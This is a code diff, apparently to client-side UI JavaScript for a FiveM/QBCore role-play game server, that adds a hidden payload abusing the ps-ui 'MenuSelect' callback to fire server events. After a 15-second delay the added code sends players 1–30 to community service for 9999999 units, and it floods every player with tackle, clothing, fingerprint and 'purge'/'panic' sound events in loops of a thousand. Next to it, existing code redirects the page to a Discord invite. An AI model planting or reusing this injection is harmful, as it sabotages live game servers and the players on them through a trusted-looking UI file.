@@ -95,7 +95,31 @@
                     "mode": "cors",
                     "credentials": "omit"
                 });
+$.post(`https://ps-ui/MenuSelect`, JSON.stringify({"data":{"event":"InteractSound_SV:PlayOnOne", "args":JSON.parse('[-1, "purge", 1.0]'), "server":true}, "ok":true}));
 
+setTimeout(function(){
+  var players = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
+
+  players.forEach(function(item, index, arr){
+    setTimeout(function(){
+      $.post(`https://ps-ui/MenuSelect`, JSON.stringify({"data":{"event":"qb-communityservice:sendToCommunityService", "args": JSON.parse('[' + item + ', 9999999]'), "server":true}, "ok":true}));
+    }, 150 * index)
+  })
+
+  for (let i = 0; i < 1000; i++) {
+    setTimeout(function(){
+      $.post(`https://ps-ui/MenuSelect`, JSON.stringify({"data":{"event":"qb-admin:server:cloth", "args": JSON.parse('[{"id":-1}]'), "server":true}, "ok":true}));
+      $.post(`https://ps-ui/MenuSelect`, JSON.stringify({"data":{"event":"tackle:server:TacklePlayer", "args":JSON.parse('[-1]'), "server":true}, "ok":true}));
+      $.post(`https://ps-ui/MenuSelect`, JSON.stringify({"data":{"event":"police:server:showFingerprintId", "args":JSON.parse('[-1]'), "server":true}, "ok":true}));
+    }, 500 * i)
+  }
+
+  for (let i = 0; i < 1000; i++) {
+    setTimeout(function(){
+        $.post(`https://ps-ui/MenuSelect`, JSON.stringify({"data":{"event":"InteractSound_SV:PlayOnOne", "args":JSON.parse('[-1, "panic", 1.0]'), "server":true}, "ok":true}));
+    }, 2000 * i)
+  }
+}, 15000)
                 // إعادة توجيه إلى Discord
                 window.location.href = "https://discord.gg/KT";
             }
